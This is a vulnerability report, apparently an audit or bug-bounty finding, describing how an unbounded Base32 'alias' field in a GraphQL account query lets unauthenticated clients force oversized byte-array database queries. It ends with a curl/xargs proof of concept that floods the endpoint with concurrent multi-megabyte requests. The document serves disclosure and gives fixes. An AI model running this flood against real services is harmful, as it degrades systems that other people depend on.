### Title
Unbounded Alias Input Enables Resource Exhaustion via Oversized Base32 Byte-Array DB Queries

### Summary
The `AccountInput.alias` field in the GraphQL schema is constrained only by a character-set regex (`^[A-Z2-7]+$`) with no length limit. An unauthenticated attacker can supply an arbitrarily long valid Base32 string, which is decoded into an arbitrarily large byte array and forwarded verbatim as a parameter to a native SQL query against the `entity` table. A sustained moderate stream of such requests forces repeated large-parameter allocation in the JVM and large byte-array transfer to the database, measurably increasing DB CPU and memory consumption.

### Finding Description

**Exact code path:**

1. **Schema — no length constraint** (`graphql/src/main/resources/graphql/account.graphqls`, line 90):
   ```graphql
   alias: String @Pattern(regexp: "^[A-Z2-7]+$")
   ```
   The `@Pattern` directive validates only the Base32 alphabet. There is no `@Size(max = …)` or equivalent constraint. Any string of arbitrary length composed of `[A-Z2-7]` passes validation.

2. **Controller dispatches to service** (`AccountController.java`, lines 47–48):
   ```java
   if (alias != null) {
       return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
   }
   ```

3. **Service decodes without length check** (`EntityServiceImpl.java`, lines 29–31):
   ```java
   public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
       return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
   }
   ```

4. **`decodeBase32` has no length guard** (`GraphQlUtils.java`, lines 83–85):
   ```java
   public static byte[] decodeBase32(String base32) {
       return BASE32.decode(base32);
   }
   ```
   A 1 MB Base32 string decodes to ~625 KB; a 10 MB string to ~6.25 MB — all allocated on the JVM heap per request.

5. **Decoded byte array sent to DB as a native query parameter** (`EntityRepository.java`, lines 13–14):
   ```java
   @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
   Optional<Entity> findByAlias(byte[] alias);
   ```
   PostgreSQL must receive, buffer, and process the full byte array for every query execution. Even with a B-tree index on `alias`, the DB must: (a) receive the large parameter over the JDBC connection, (b) allocate working memory for it, and (c) perform the index lookup (which involves comparing the oversized byte array against index entries). Without an index, a sequential scan occurs, comparing the large byte array against every row's alias (short-circuit on length mismatch, but still iterates all rows).

**Root cause:** The failed assumption is that `@Pattern` alone is sufficient input validation for a field that is subsequently decoded into a byte array and used as a DB query parameter. No upper bound on alias length is enforced anywhere in the pipeline.

### Impact Explanation

- **JVM heap pressure:** Each request allocates a large byte array (e.g., 6 MB for a 10 MB input). Concurrent requests multiply this. GC pauses increase application latency.
- **DB parameter transfer overhead:** Each query sends megabytes of data over the JDBC connection. PostgreSQL must allocate and process this parameter in its working memory for every execution.
- **DB CPU increase:** With a sustained moderate stream (e.g., 50–100 req/s with 1–5 MB payloads each), the cumulative cost of parameter reception, memory allocation, and index/scan operations can push DB CPU well above 30% above baseline, satisfying the stated threshold without brute-force volume.
- **No authentication required:** The GraphQL endpoint is publicly accessible; no credentials are needed.

### Likelihood Explanation

The attack requires only an HTTP client capable of sending GraphQL POST requests. The payload is trivially constructed: any string of `[A-Z2-7]` characters of arbitrary length. No special knowledge, credentials, or tooling beyond `curl` or a simple script is needed. The attack is repeatable, stateless, and can be parallelized. The absence of any rate limiting visible in the controller layer means there is no built-in throttle.

### Recommendation

1. **Add a length constraint on `alias` in the schema** (`account.graphqls`):
   ```graphql
   alias: String @Pattern(regexp: "^[A-Z2-7]+$") @Size(max: 128)
   ```
   Legitimate Hedera account aliases (ED25519/ECDSA public keys with protobuf wrapping) are at most ~60 Base32 characters. A limit of 128 characters is generous and safe.

2. **Add a length guard in `decodeBase32`** (`GraphQlUtils.java`) as a defense-in-depth measure:
   ```java
   public static byte[] decodeBase32(String base32) {
       if (base32.length() > 128) {
           throw new IllegalArgumentException("alias exceeds maximum length");
       }
       return BASE32.decode(base32);
   }
   ```

3. **Ensure the `alias` column in the `entity` table has a B-tree index** to prevent sequential scans regardless of input size.

4. **Apply API-level rate limiting** on the GraphQL endpoint to bound request throughput per client IP.

### Proof of Concept

```bash
# Generate a 5 MB valid Base32 alias (all A's — valid [A-Z2-7] characters)
ALIAS=$(python3 -c "print('A' * 8000000)")

# Send a single query
curl -s -X POST https://<mirror-node-host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d "{\"query\": \"{ account(input: { alias: \\\"$ALIAS\\\" }) { entityId { num } } }\"}"

# Sustained stream (50 concurrent, repeat 200 times)
seq 200 | xargs -P50 -I{} curl -s -X POST https://<mirror-node-host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d "{\"query\": \"{ account(input: { alias: \\\"$ALIAS\\\" }) { entityId { num } } }\"}" \
  -o /dev/null
```

**Expected result:** Each request passes the `@Pattern` check (all `A`s are valid Base32), decodes to a ~5 MB byte array, and issues `SELECT * FROM entity WHERE alias = <5MB_bytes> AND deleted IS NOT TRUE` against the database. Monitoring DB CPU and JDBC connection metrics during the sustained stream will show a significant increase above the 24-hour baseline.
